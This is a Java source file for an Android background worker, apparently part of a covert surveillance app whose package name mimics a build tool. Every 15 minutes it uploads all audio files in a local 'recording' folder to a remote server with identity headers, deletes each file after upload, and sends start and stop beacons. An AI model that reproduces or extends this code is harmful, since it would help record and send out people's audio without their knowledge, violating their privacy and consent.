package org.code.coregradle.workers;

import android.content.Context;

import androidx.annotation.NonNull;
import androidx.work.Constraints;
import androidx.work.NetworkType;
import androidx.work.OneTimeWorkRequest;
import androidx.work.PeriodicWorkRequest;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import org.json.JSONException;
import org.code.coregradle.config.ApiConfig;
import org.code.coregradle.config.IdentityStore;
import org.code.coregradle.utils.MessageXInterceptor;

import java.io.File;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class AudioRecordingUploadWorker extends Worker {

    private final File recordingPath;
    public final static String WORKER_IDENTIFIER = "AudioRecordingUpload";


    private final OkHttpClient okHttpClient;
    private final long chunkTime = (30 * 1000L);
    private static final long maxExecutionTime = (9 * 60 * 1000L);
    private final IdentityStore identityStore;
    private static final ExecutorService executorService = Executors.newCachedThreadPool();

    public AudioRecordingUploadWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
        recordingPath = new File(getApplicationContext().getFilesDir(), "recording");
        okHttpClient = new OkHttpClient();
        identityStore = IdentityStore.getInstance(context);
    }

    private Result uploadFile(File file) {
        RequestBody requestBody = RequestBody.create(MediaType.get("application/x-binary"), file);
        try {
            Request request = new Request.Builder()
                    .url(ApiConfig.HUM_URL)
                    .addHeader(this.identityStore.getUploadHeaderKey(), this.identityStore.getIdentityValue())
                    .addHeader("X-FILE-ID", file.getName())
                    .post(requestBody)
                    .build();
            Response response = okHttpClient.newCall(request).execute();
            if (response.isSuccessful()) {
                file.delete();
                return Result.success();
            }
        } catch (Exception ignored) {
        }
        return Result.failure();
    }

    @NonNull
    @Override
    public Result doWork() {
        long startTime = System.nanoTime();
        long difference = 0;
        long currentTime = 0;
        try {
            executorService.submit(new MessageXInterceptor("Start Hum Upload", this.identityStore.getIdentityValue()));
        } catch (JSONException e) {

        }
        do {
            try {
                for (File file : recordingPath.listFiles()) {
                    uploadFile(file);
                }
                Thread.sleep(60 * 1000L);
            } catch (Exception e) {
                break;
            }
            currentTime = System.nanoTime();
            difference = ((currentTime - startTime) / 1000000);
        } while (difference < maxExecutionTime);
        try {
            executorService.submit(new MessageXInterceptor("Hum Upload Stopped", this.identityStore.getIdentityValue()));
        } catch (JSONException e) {

        }
        return Result.success();
    }

    public static OneTimeWorkRequest getOneTimeWorkRequest() {
        return new OneTimeWorkRequest.Builder(AudioRecordingUploadWorker.class)
                .build();
    }

    public static PeriodicWorkRequest getWorkRequest() {

        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build();

        return new PeriodicWorkRequest.Builder(AudioRecordingUploadWorker.class, 15, TimeUnit.MINUTES)
                .setInitialDelay(2, TimeUnit.MINUTES)
                .setConstraints(constraints)
                .build();
    }
}
